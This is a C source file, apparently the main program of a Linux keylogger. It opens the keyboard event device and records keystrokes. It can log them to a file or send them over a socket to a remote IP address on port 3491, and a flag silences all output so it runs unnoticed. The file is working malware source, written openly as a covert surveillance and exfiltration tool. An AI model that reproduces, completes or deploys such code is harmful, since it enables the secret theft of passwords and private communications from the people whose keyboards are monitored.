#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylogger.h"
#include "networking.h"
#include "find_event_file.h"


#define PORT "3491"

void print_usage_and_quit(char *application_name);

int main(int argc, char *argv[]){
    char *KEYBOARD_DEVICE = get_keyboard_event_file();
    if(!KEYBOARD_DEVICE){
        print_usage_and_quit(argv[0]);
    }

    int writeout;
    int keyboard;

    int network = 0, file = 0, option = 0;
    char *option_input;
    while((option = getopt(argc, argv,"sn:f:")) != -1){
        switch(option){
            case 's':
                freopen("/dev/null", "w", stdout);
                freopen("/dev/null", "w", stderr);
                break;
            case 'n':
                network = 1;
                option_input = optarg;
                break;
            case 'f':
                file = 1;
                option_input = optarg;
                break;
            default: print_usage_and_quit(argv[0]);
        }
    }

    // If both arguments or neither are provided...
    if(network == file){
        print_usage_and_quit(argv[0]);
    }
    else if(file){
        if((writeout = open(option_input, O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0){
            printf("Error opening file %s: %s\n", argv[2], strerror(errno));
            return 1;
        }
    }
    else if(network){
        writeout = get_socket_file_descriptor(option_input, PORT);
        if(writeout < 0){
            printf("Error creating socket on %s\n", option_input);
            return 1;
        }
    }

    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }


    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);
    free(KEYBOARD_DEVICE);

    return 0;
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-s] [-n ip-address | -f output-file]\n", application_name);
    exit(1);
}
